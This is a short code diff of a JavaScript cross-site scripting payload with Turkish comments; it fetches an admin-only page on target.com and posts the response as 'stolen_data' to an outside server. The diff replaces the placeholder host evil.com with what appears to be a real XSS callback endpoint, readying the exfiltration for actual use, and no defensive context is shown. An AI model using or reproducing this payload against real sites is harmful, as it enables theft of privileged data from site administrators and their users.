@@ -5,7 +5,7 @@ fetch('https://target.com/admin/workflow', { // Admin'in erişebildiği sayfa
 }).then(response => response.text()) // Yanıtı text olarak al
 .then(data => {
     // Çektiğimiz veriyi kendi sunucumuza gönder
-    fetch('https://evil.com/steal-data', {
+    fetch('https://xss.report/c/alesta', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ stolen_data: data })
